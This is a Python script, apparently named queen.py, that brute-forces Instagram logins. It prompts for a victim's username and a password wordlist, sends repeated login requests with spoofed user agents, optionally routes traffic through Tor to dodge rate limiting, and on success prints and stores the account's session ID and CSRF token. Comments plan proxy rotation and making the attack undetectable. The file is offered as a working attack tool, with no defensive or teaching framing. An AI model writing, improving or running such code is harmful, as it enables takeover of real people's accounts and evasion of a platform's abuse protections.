#!/usr/bin/python3
import os
import time
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/d__amara/"

payload = {
    "queryParams" : {},
    "optIntoOneTap" : "false"
}

login_header = {
    "User-Agent" : fake_agent(),#"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "X-Requested-With" : "XMLHttpRequest",
    "Referer" : instagram_url
}
# adding local tor proxy "sudo systemctl enable tor"
proxy = {
    'http':  'socks5://localhost:9050',
    'https': 'socks5://localhost:9050',
}

cookie_request = requests.get(instagram_url)
csrf = cookie_request.cookies['csrftoken']
login_header.update({"x-csrftoken" : csrf})

def green(text):
    return "\033[92m{}\033[00m".format(text)

def attack_start_notify(target):
    try:
        os.system(f'herbe "Starting attack to victim: {target}"')
        print(f"Staring attack to victim: {target}")
    except:
        print(f"Staring attack to victim: {target}")

def attack_hack_notify(hack):
    try:
        os.system(f"herbe 'target password founded: {hack}'")
        print(f"[+] target password founded: {hack}")
    except:
        print(f"[+] target password founded: {hack}")

def crack(save, server, password, victim):
    global hack_request
    if server == "enable":
        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
    elif server == "disable":
        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    if save.lower() == "y":
        with open(f"tryed/{victim}", "a") as tryed:
            tryed.write(password)
    print(f"[-] trying password: {password}")
    time.sleep(5)
    hack_data = json.loads(hack_request.text)
    print(f'[{green("INFO")}]: {hack_data}')
    return hack_data

def attack(tor, target, wordlist_file, save):
    tryes = 0
    for hack in wordlist_file:
        tryes += 1
        hack = hack.strip()
        # TOOD add change proxy server after every 10 tryes
        payload.update({
            "enc_password" : f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })
        try:
            if crack(save,tor, hack, target)["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack,)).start()
                cookies = hack_request.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id: ", session_id)
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print("[-] instagram detected spam attack\n[+] changing server to tor (required tor)")
            time.sleep(3)
            # TODO make undetectable
            crack(save, "disable", hack, target)

def main():
    # parsing arguments see ./queen.py -h
    parser = argparse.ArgumentParser()
    parser.add_argument("--tor",
                        metavar="enable or disable",
                        type=str,
                        required=True,
                        help='attacking with or without tor server')
    args = parser.parse_args()
    target = input("[+] target username: ")
    payload.update({"username" : target})
    # TODO: CHECK IF USER EXIST WITH SIMPLE REQUEST
    #check_request = requests.get(f"https://www.instagram.com/{target}")#,proxies=proxy)
    #if check_request.status_code != 200:
    #    print(check_request.status_code)
    #    print("target username not found")
    #    exit()
    #elif check_request.url == f"{instagram_url}?next=/{target}/":
    #    #TOOD add proxy server 
    #    print(check_request.url)
    #    print("changing proxy server please wait")
    #    #exit()

    wordlist = input("[+] wordlist path: ")
    try:
        bruteforce = open(wordlist, "r")
    except FileNotFoundError:
        print("[-] wordlist file not found\n[+] trying to open wordlist.txt file")
        try:
            bruteforce = open(f'{wordlist}.txt', 'r')
        except FileNotFoundError:
            print("[-] wordlist.txt file not found")
            exit()
    print('[+] changing wordlist path to {wordlist}.txt')
    save = input("[+] do you want ot save tryed passwords(y/n): ")
    if save.lower() == "y":
        print(f"[+] the tryed passwords file path will be tryed/{target}.txt")
    attack(args.tor, target, bruteforce, save)

if __name__ == "__main__":
    main()
